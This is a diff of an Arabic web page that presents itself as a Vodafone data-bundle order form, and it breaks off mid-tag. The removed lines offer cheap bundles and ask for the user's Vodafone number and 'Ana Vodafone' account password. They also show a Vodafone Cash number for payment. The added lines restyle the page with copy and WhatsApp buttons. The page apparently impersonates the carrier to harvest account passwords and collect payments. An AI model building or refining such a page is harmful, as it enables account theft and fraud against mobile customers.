@@ -5,19 +5,24 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>طلب باقات فودافون</title>
 <style>
-    body{background:#0a0a0a;color:#fff;font-family:'Arial';margin:0;padding:20px;text-align:center}
-    h1{font-size:24px;margin-bottom:5px}
-    .subtitle{color:#aaa;margin-bottom:20px}
-    .section{margin:20px 0;text-align:right;max-width:500px;margin:auto}
-    .section-title{font-weight:bold;margin:15px 0}
-    .box{background:#1a1a1a;border:2px solid #2a2a2a;border-radius:12px;padding:15px;margin:10px 0;cursor:pointer;transition:0.3s}
-    .box:hover{border-color:#E60000}
+    body{background:#0a0a0a;color:#fff;font-family:Arial;margin:0;padding:20px;text-align:center}
+    h1{font-size:22px;margin-bottom:5px}
+    .subtitle{color:#aaa;margin-bottom:20px;font-size:14px}
+    .box{background:#1a1a1a;border:2px solid #2a2a2a;border-radius:12px;padding:15px;margin:10px 0;text-align:center}
     .box-title{font-size:18px;font-weight:bold}
     .price{color:#E60000;font-size:20px;font-weight:bold;margin-top:5px}
-    input,select{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #333;background:#1a1a1a;color:#fff;box-sizing:border-box;text-align:right}
-    .cash{background:#1a0000;border:2px dashed #E60000;padding:15px;border-radius:12px;margin-top:20px}
-    .cash-title{font-size:16px}
-    .cash-num{color:#E60000;font-size:22px;font-weight:bold;letter-spacing:2px}
+    .section{margin:20px 0;text-align:right;max-width:500px;margin:20px auto}
+    .label{font-weight:bold;margin-top:15px;text-align:right;font-size:16px}
+    input,select{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:1px solid #333;background:#1a1a1a;color:#fff;box-sizing:border-box;text-align:right;font-size:16px}
+    input::placeholder{color:#666}
+    .cash{background:#1a0000;border:2px dashed #E60000;padding:20px;border-radius:12px;margin-top:20px;text-align:center}
+    .cash-title{font-size:16px;margin-bottom:10px}
+    .cash-num{color:#E60000;font-size:24px;font-weight:bold;letter-spacing:2px;margin:10px 0}
+    .btn-copy{background:#E60000;color:#fff;border:none;padding:10px 25px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:16px}
+    .btn-copy:active{background:#b30000}
+    .btn-whatsapp{background:#25D366;color:#fff;border:none;padding:16px;border-radius:12px;width:100%;font-size:18px;font-weight:bold;cursor:pointer;margin-top:20px;display:flex;align-items:center;justify-content:center;gap:8px}
+    .btn-whatsapp:active{background:#1da851}
+    .note{color:#aaa;font-size:12px;margin-top:10px;text-align:center}
 </style>
 </head>
 <body>
@@ -26,63 +31,5 @@
 <p class="subtitle">اختار الباقة المطلوبة ثم املأ البيانات</p>
 
 <div class="section">
-    <div class="section-title">1. اختر الباقة</div>
-    
     <div class="box">
-        <div class="box-title">5200 ميجا</div>
-        <div class="price">120 جنيه</div>
-    </div>
-    
-    <div class="box">
-        <div class="box-title">10400 ميجا</div>
-        <div class="price">220 جنيه</div>
-    </div>
-
-    <div class="box">
-        <div class="box-title">7500 ميجا</div>
-        <div class="price">120 جنيه</div>
-    </div>
-
-    <div class="box">
-        <div class="box-title">11500 ميجا</div>
-        <div class="price">180 جنيه</div>
-    </div>
-
-    <div class="box">
-        <div class="box-title">20 الف ميجا</div>
-        <div class="price">280 جنيه</div>
-    </div>
-
-    <div class="box">
-        <div class="box-title">31500 ميجا</div>
-        <div class="price">440 جنيه</div>
-    </div>
-
-    <div class="box">
-        <div class="box-title">49 الف ميجا</div>
-        <div class="price">550 جنيه</div>
-    </div>
-</div>
-
-<div class="section">
-    <div class="section-title">2. رقم فودافون</div>
-    <input type="tel" placeholder="01xxxxxxxxx">
-</div>
-
-<div class="section">
-    <div class="section-title">3. كلمة مرور أنا فودافون</div>
-    <input type="password" placeholder="اكتب الباسورد أو اتركها فارغة">
-    <p style="color:#aaa;font-size:14px">إذا كنت لا تعرف كلمة المرور</p>
-    <select>
-        <option>أول مرة بتعامل معاكم</option>
-        <option>نسيت كلمة المرور</option>
-    </select>
-</div>
-
-<div class="section cash">
-    <div class="cash-title">رقم فودافون كاش للتحويل 📲</div>
-    <div class="cash-num">01035562989</div>
-</div>
-
-</body>
-</html>
+        <div class="box
